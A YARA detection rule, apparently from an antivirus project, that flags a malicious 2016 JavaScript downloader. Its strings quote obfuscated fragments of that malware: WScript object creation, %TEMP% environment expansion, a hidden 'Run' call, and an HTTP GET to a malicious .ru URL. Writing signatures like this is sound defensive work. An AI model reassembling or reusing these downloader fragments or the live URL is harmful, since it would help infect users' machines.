rule sig_20160428_eee010a491372d412ed6c93ed6e48dde {
  meta:
    description = "datamaliciousorder - file 20160428_eee010a491372d412ed6c93ed6e48dde.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19dc8bd2ec58037fc7d7fda9b54979b4e8bab99c00bb134af672321626e2e8b4"

  strings:
    $s1  = "return NftPqvXiiRtyZywQumEag - WwpEovKhaSmiFddMxtObr;};" fullword ascii
    $s2  = "function HufLzqAokDsfSkcUviBsz(NftPqvXiiRtyZywQumEag, WwpEovKhaSmiFddMxtObr){RieDudBwfNmwQipJlvIhw = RieDudBwfNmwQipJlvIhw * 1; " ascii
    $s3  = "function KovXfhSazPjcQhsWaeDum() {return MeyOrvKhyKwwFurGtjQqw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function WjeHfjRloKdiLmoFvoRey(XpjOsoBbmBlcKiwCteIju){MeyOrvKhyKwwFurGtjQqw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function HufLzqAokDsfSkcUviBsz(NftPqvXiiRtyZywQumEag, WwpEovKhaSmiFddMxtObr){RieDudBwfNmwQipJlvIhw = RieDudBwfNmwQipJlvIhw * 1; " ascii
    $s6  = "function WjeHfjRloKdiLmoFvoRey(XpjOsoBbmBlcKiwCteIju){MeyOrvKhyKwwFurGtjQqw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s7  = "var MeyOrvKhyKwwFurGtjQqw = function ZfhBotXsmLldBvtBiuHyb() {return FmrBsaZmnKahPrlJndXyw[LdbPtfFikXmmSkeDhuZme](\"WScript\"+\"" ascii
    $s8  = "AxlMnyIybVvoJoiIseSjb[VvwZnaTodUcrJihDrcCdm](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s9  = "var MeyOrvKhyKwwFurGtjQqw = function ZfhBotXsmLldBvtBiuHyb() {return FmrBsaZmnKahPrlJndXyw[LdbPtfFikXmmSkeDhuZme](\"WScript\"+\"" ascii
    $s10 = "var FmrBsaZmnKahPrlJndXyw = this[\"WScript\"];" fullword ascii
    $s11 = "function KovXfhSazPjcQhsWaeDum() {return MeyOrvKhyKwwFurGtjQqw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (AxlMnyIybVvoJoiIseSjb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function LccIymVwzKlfAxvUydTaq(){return FxvPwuTbwNvgLcgEklUhg + \"\";};" fullword ascii
    $s14 = "function CgxEjrOafLulBqqFqjEdw() {return ((MhuAspCdiQpyPjzDzoMox == true) && (MhuAspCdiQpyPjzDzoMox == GzgJwwVmjZkfCddIksIcj)) ?" ascii
    $s15 = "function CgxEjrOafLulBqqFqjEdw() {return ((MhuAspCdiQpyPjzDzoMox == true) && (MhuAspCdiQpyPjzDzoMox == GzgJwwVmjZkfCddIksIcj)) ?" ascii
    $s16 = "function CciRjmVekVdkQoxPubPym(){return 23;};" fullword ascii
    $s17 = "GzgJwwVmjZkfCddIksIcj = true; " fullword ascii
    $s18 = "var FnoAqlPzsNasRdmPloSim = false;" fullword ascii
    $s19 = "function QlfPeuUkhJkvApzRtiGzj(HjePcpCgbWzkLtsDrpUlx) {var YfwDgiHdbMurNpwPtvXhe = (1, 2, 3, 4, 5, HjePcpCgbWzkLtsDrpUlx); retur" ascii
    $s20 = "var GzgJwwVmjZkfCddIksIcj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}